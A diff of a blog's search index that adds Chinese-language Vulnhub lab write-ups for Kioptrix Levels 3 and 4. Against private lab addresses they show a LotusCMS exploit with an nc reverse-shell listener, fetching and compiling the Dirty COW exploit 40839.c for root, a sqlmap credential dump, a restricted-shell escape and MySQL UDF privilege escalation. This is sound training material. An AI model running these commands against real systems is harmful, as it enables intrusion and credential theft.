@@ -1,42 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Kioptix Level 3</title>
-    <url>/2021/12/07/Kioptrix-Level-3/</url>
-    <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.131</code> –<strong>开放80端口</strong><br><img src="/2021/12/07/Kioptrix-Level-3/1.png"></p>
-<p><strong>访问下，发现是个</strong><br><font color="red"><strong>LotusCMS</strong></font></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/2.png"></p>
-<p><code>search LotusCMS</code>  —<strong>在msf中查找LotusCMS有关漏洞</strong><br><img src="/2021/12/07/Kioptrix-Level-3/3.png"></p>
-<p><code>set URI /</code>–<strong>-这里需要把URL路径改为/</strong><br><img src="/2021/12/07/Kioptrix-Level-3/4.png"></p>
-<p><code>run</code> —-<strong>貌似出问题了，无法shell 百度了说是什么中英文版本的问题–没有解决</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/5.png"></p>
-<p><strong>最后百度了下LotusCMS的exp</strong></p>
-<h4 id="二、0x00漏洞利用-LotusCMS漏洞"><a href="#二、0x00漏洞利用-LotusCMS漏洞" class="headerlink" title="二、0x00漏洞利用(LotusCMS漏洞)"></a>二、0x00漏洞利用(LotusCMS漏洞)</h4><p><code>git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit</code></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/6.png"></p>
-<p><code>nc -lvp 7777</code><strong>先开启监听端口7777</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/7.png"></p>
-<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><strong>成功弹到shell优化终端</strong><br><img src="/2021/12/07/Kioptrix-Level-3/8.png"><br><strong>发现权限不是root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/9.png"></p>
-<h4 id="三、0x01提权-脏牛提权"><a href="#三、0x01提权-脏牛提权" class="headerlink" title="三、0x01提权(脏牛提权)"></a>三、0x01提权(脏牛提权)</h4><p><code>uname -a</code>–<strong>查看内核(2.6.24-24)</strong></p>
-<p><code>searchsploit privilege | grep linux | grep 2.6.2</code>  **–**<strong>查找有无可利用漏洞</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/10.png"></p>
-<p>–<strong>先将40839.c先wget到本地后再wget到靶机上–</strong></p>
-<p><code>cd /tmp</code>  <strong>先到靶机tmp目录</strong></p>
-<p><code>wget http://192.168.249.132:8000/40839.c</code>  –这里使用的是<strong>SimpleHTTPServer</strong></p>
-<p><code>gcc -pthread 40839.c -o 40839 -lcrypt</code><strong>–按照40839.c的注释进行编译</strong></p>
-<p><code>./40839 123456</code><br><img src="/2021/12/07/Kioptrix-Level-3/11.png"></p>
-<p><strong>–设置密码为123456</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/12.png"></p>
-<p><code>ssh firefart@192.168.249.131</code> <strong>—SSH连接成功root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/13.png"></p>
-]]></content>
-      <categories>
-        <category>Vulnhub系列</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kioptix Level 2</title>
     <url>/2021/12/05/Kioptrix-Level-2/</url>
     <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
@@ -78,6 +42,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Kioptix Level 3</title>
+    <url>/2021/12/07/Kioptrix-Level-3/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.131</code> –<strong>开放80端口</strong><br><img src="/2021/12/07/Kioptrix-Level-3/1.png"></p>
+<p><strong>访问下，发现是个</strong><br><font color="red"><strong>LotusCMS</strong></font></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/2.png"></p>
+<p><code>search LotusCMS</code>  —<strong>在msf中查找LotusCMS有关漏洞</strong><br><img src="/2021/12/07/Kioptrix-Level-3/3.png"></p>
+<p><code>set URI /</code>–<strong>-这里需要把URL路径改为/</strong><br><img src="/2021/12/07/Kioptrix-Level-3/4.png"></p>
+<p><code>run</code> —-<strong>貌似出问题了，无法shell 百度了说是什么中英文版本的问题–没有解决</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/5.png"></p>
+<p><strong>最后百度了下LotusCMS的exp</strong></p>
+<h4 id="二、0x00漏洞利用-LotusCMS漏洞"><a href="#二、0x00漏洞利用-LotusCMS漏洞" class="headerlink" title="二、0x00漏洞利用(LotusCMS漏洞)"></a>二、0x00漏洞利用(LotusCMS漏洞)</h4><p><code>git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit</code></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/6.png"></p>
+<p><code>nc -lvp 7777</code><strong>先开启监听端口7777</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/7.png"></p>
+<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><strong>成功弹到shell优化终端</strong><br><img src="/2021/12/07/Kioptrix-Level-3/8.png"><br><strong>发现权限不是root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/9.png"></p>
+<h4 id="三、0x01提权-脏牛提权"><a href="#三、0x01提权-脏牛提权" class="headerlink" title="三、0x01提权(脏牛提权)"></a>三、0x01提权(脏牛提权)</h4><p><code>uname -a</code>–<strong>查看内核(2.6.24-24)</strong></p>
+<p><code>searchsploit privilege | grep linux | grep 2.6.2</code>  **–**<strong>查找有无可利用漏洞</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/10.png"></p>
+<p>–<strong>先将40839.c先wget到本地后再wget到靶机上–</strong></p>
+<p><code>cd /tmp</code>  <strong>先到靶机tmp目录</strong></p>
+<p><code>wget http://192.168.249.132:8000/40839.c</code>  –这里使用的是<strong>SimpleHTTPServer</strong></p>
+<p><code>gcc -pthread 40839.c -o 40839 -lcrypt</code><strong>–按照40839.c的注释进行编译</strong></p>
+<p><code>./40839 123456</code><br><img src="/2021/12/07/Kioptrix-Level-3/11.png"></p>
+<p><strong>–设置密码为123456</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/12.png"></p>
+<p><code>ssh firefart@192.168.249.131</code> <strong>—SSH连接成功root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/13.png"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptix Level 1</title>
     <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
     <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
@@ -105,6 +105,46 @@
 <p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
 <p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
 <p><strong>—–搞定—–</strong></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptrix Level 4</title>
+    <url>/2021/12/09/Kioptrix-Level-4/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.133</strong><br><strong>kali:192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.133</code> <strong>—查看开放端口</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/1.png"></p>
+<p><strong>—查看下80端口—</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/2.png"></p>
+<p><strong>—是个登录框可能猜测sql注入漏洞—</strong></p>
+<p><strong>—在用户名和密码处*标记，sqlmap跑一下</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/3.png"></p>
+<p><code>sqlmap -r 1.txt --level 3 -risk 2 --batch -D members -T members -C password,username --dump</code><strong>—爆出用户名john密码MyNameIsJohn</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/4.png"></p>
+<p><code>ssh john@192.168.249.133</code><strong>—–得到账号密码,先尝试ssh连接下</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/5.png"></p>
+<p><strong>—-可以连接但发现很多命令没法执行—</strong></p>
+<h4 id="二、逃逸受限shell"><a href="#二、逃逸受限shell" class="headerlink" title="二、逃逸受限shell"></a>二、逃逸受限shell</h4><p><a href="https://www.lshack.cn/653/" title="逃逸linux各种shell执行命令">逃逸linux各种shell执行命令</a></p>
+<p><code>echo os.system(&quot;/bin/bash&quot;)</code> <strong>–echo命令逃逸受限shell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/6.png"></p>
+<h4 id="三、权限提升-mysql-udf提权"><a href="#三、权限提升-mysql-udf提权" class="headerlink" title="三、权限提升(mysql udf提权)"></a>三、权限提升(mysql udf提权)</h4><p><code>uname -a</code> <strong>–先查看下内核</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/7.png"></p>
+<p><strong>–显然可以脏牛提权,但没有gcc—</strong></p>
+<p><code>cat /etc/passwd</code> –<strong>查看系统用户配置文件发现john和robert用户默认使用kshell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/8.png"></p>
+<p><code>ps -ef</code> <strong>-查看下进程</strong><br><img src="/2021/12/09/Kioptrix-Level-4/9.png"></p>
+<p><strong>–发现mysql是root权限–</strong></p>
+<p><code>mysql -u root</code>  <strong>–root无密码即可登录</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/10.png"></p>
+<p><strong>–学到了<font color="red">mysql udf提权</font>—</strong></p>
+<p><code>select * from func;</code> <strong>–发现有执行命令函数</strong><br><img src="/2021/12/09/Kioptrix-Level-4/11.png"></p>
+<p><strong>—可以赋予john用户root权限</strong></p>
+<p><code>select sys_exec(&#39;usermod -a -G admin john&#39;);</code> <strong>–赋予权限</strong></p>
+<p><code>sudo su</code> <strong>–输入john密码即拥有root权限</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/12.png"></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
